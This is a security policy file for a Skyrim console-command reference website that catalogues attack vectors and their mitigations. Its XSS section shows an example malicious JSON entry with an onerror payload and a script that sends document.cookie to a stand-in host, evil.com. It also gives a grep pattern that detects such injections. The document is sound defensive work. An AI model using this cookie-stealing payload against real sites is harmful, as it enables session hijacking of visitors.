# Security Policy

## Reporting a Vulnerability

If you discover a security vulnerability, please **DO NOT** open a public issue. Instead:

1. Email the maintainer directly (add your email here)
2. Include detailed steps to reproduce the vulnerability
3. Allow reasonable time for a fix before public disclosure

We take security seriously and will respond promptly to legitimate security concerns.

## Known Attack Vectors and Mitigations

### 1. Cross-Site Scripting (XSS) via JSON Data Injection

**Risk Level**: HIGH

**Attack Scenario:**
A malicious contributor could submit a pull request with JavaScript code embedded in the JSON file. If this data is rendered to the page without proper sanitization, it could execute arbitrary JavaScript in users' browsers.

**Example Malicious PR:**
```json
"basic_items": {
  "malicious_item": {
    "id": "<img src=x onerror='alert(document.cookie)'>",
    "command": "player.additem 123 1",
    "name": "Innocent Item<script>window.location='https://evil.com/steal?cookie='+document.cookie</script>"
  }
}
```

**Current Vulnerability:**
In `script.js:479-480`, the `category` and `id` fields are NOT properly escaped:
```javascript
<span class="card-category">${cmd.category}</span>
${cmd.id ? `<span class="card-id">ID: ${cmd.id}</span>` : ''}
```

**Impact:**
- Session hijacking
- Cookie theft
- Redirects to phishing sites
- Defacement of the site
- Keylogging user input

**Mitigation:**

1. **Code Fix Required** - Update `createCommandCard()` function in script.js:
```javascript
function createCommandCard(cmd) {
    return `
        <div class="command-card pixel-border" data-command="${escapeHtml(cmd.command)}">
            <div class="card-header">
                <span class="card-category">${escapeHtml(cmd.category)}</span>
                ${cmd.id ? `<span class="card-id">ID: ${escapeHtml(cmd.id)}</span>` : ''}
            </div>
            <div class="card-name">${escapeHtml(cmd.name)}</div>
            <div class="card-command">${escapeHtml(cmd.command)}</div>
            <div class="card-description">${escapeHtml(cmd.description)}</div>
        </div>
    `;
}
```

2. **PR Review Process** - Before merging ANY pull request:
   - Manually inspect all JSON changes for suspicious patterns
   - Look for: `<script>`, `onerror=`, `onclick=`, `javascript:`, `<iframe>`, `<img>`, etc.
   - Test the PR locally before merging
   - Use automated JSON validation

3. **Content Security Policy (CSP)** - Add to `index.html` and `guide.html`:
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self';
               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
               font-src https://fonts.gstatic.com;
               img-src 'self' data:;
               object-src 'none';">
```

### 2. JSON Injection via Builder Feature

**Risk Level**: MEDIUM

**Attack Scenario:**
The builder feature uses `JSON.parse()` on values from select elements. While the data comes from the JSON file (which should be trusted), if the JSON file is compromised, malicious payloads could be injected.

**Location:**
- `script.js:129, 150, 184, 201, 228, 234` - Multiple JSON.parse calls

**Mitigation:**
- The XSS fixes above will prevent this
- Add try-catch blocks around JSON.parse calls
- Validate parsed data structure before use

### 3. Malicious JSON File Replacement

**Risk Level**: MEDIUM

**Attack Scenario:**
If someone gains access to the repository or hosting:
1. Replace `skyrim_commands_and_items.json` with malicious data
2. Site loads and executes malicious content
3. All visitors are compromised

**Mitigations:**

1. **GitHub Branch Protection:**
   - Require pull request reviews
   - Require status checks to pass
   - No direct pushes to main branch
   - Require signed commits

2. **Automated Validation (GitHub Actions):**
   Create `.github/workflows/validate.yml`:
```yaml
name: Validate JSON
on: [pull_request]
jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Validate JSON syntax
        run: |
          python3 -c "import json; json.load(open('skyrim_commands_and_items.json'))"
      - name: Check for suspicious patterns
        run: |
          if grep -E "<script|onerror=|onclick=|javascript:|<iframe" skyrim_commands_and_items.json; then
            echo "Suspicious patterns detected!"
            exit 1
          fi
```

3. **Subresource Integrity (SRI):**
   For external resources like Google Fonts, ensure integrity hashes are used

4. **File Integrity Monitoring:**
   Monitor for unexpected changes to critical files

### 4. Data Exfiltration via Search/Copy Features

**Risk Level**: LOW

**Attack Scenario:**
While the copy-to-clipboard feature is legitimate, malicious code could modify it to send copied commands to an external server.

**Current Protection:**
- Code is client-side and inspectable
- No external API calls

**Mitigation:**
- Regular code audits
- Monitor for unexpected fetch/XMLHttpRequest additions

### 5. Dependency Vulnerabilities

**Risk Level**: LOW (currently no dependencies)

**Current Status:**
The project has no JavaScript dependencies, which is excellent for security.

**Mitigation:**
- Keep it that way - avoid adding npm packages
- If dependencies become necessary, use tools like `npm audit`
- Pin dependency versions

### 6. Clickjacking

**Risk Level**: LOW

**Attack Scenario:**
Site could be embedded in a malicious iframe to trick users.

**Mitigation:**
Add to HTML files:
```html
<meta http-equiv="X-Frame-Options" content="DENY">
```

Or use CSP frame-ancestors directive (included in CSP recommendation above).

## Security Best Practices for Contributors

### DO:
✅ Test all changes locally before submitting PRs
✅ Use valid Skyrim item IDs from trusted sources (UESP Wiki)
✅ Follow the JSON structure exactly
✅ Report suspicious PRs or security concerns
✅ Keep commits focused and reviewable

### DON'T:
❌ Add HTML tags to JSON values
❌ Include external URLs or links
❌ Add JavaScript code to JSON
❌ Modify security-critical code without discussion
❌ Include personal/sensitive information

## Security Checklist for Maintainers

Before merging any PR:

- [ ] JSON file validates (no syntax errors)
- [ ] No HTML tags in JSON values
- [ ] No JavaScript keywords (`<script>`, `onerror`, `onclick`, etc.)
- [ ] No external URLs or suspicious links
- [ ] Commands follow proper Skyrim console format
- [ ] IDs are verified against UESP or Creation Kit
- [ ] Changes are limited to data additions (no code changes without security review)
- [ ] Contributor is established or changes are minimal

## Incident Response Plan

If a security breach occurs:

1. **Immediate Actions:**
   - Revert malicious commit immediately
   - Deploy patched version
   - Assess scope of compromise

2. **Communication:**
   - Post security advisory to repository
   - Notify users if data was compromised
   - Document the incident

3. **Post-Incident:**
   - Conduct security audit
   - Update security measures
   - Review and improve processes

## Regular Security Maintenance

**Monthly:**
- Review recent PRs for suspicious patterns
- Check for unexpected file changes
- Audit user-facing code

**Quarterly:**
- Full security audit of codebase
- Review and update this security policy
- Test all attack scenarios

**Annually:**
- Comprehensive penetration testing
- Review all security controls
- Update security documentation

## Additional Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [GitHub Security Best Practices](https://docs.github.com/en/code-security)

---

**Last Updated**: 2025-12-19
**Version**: 1.0
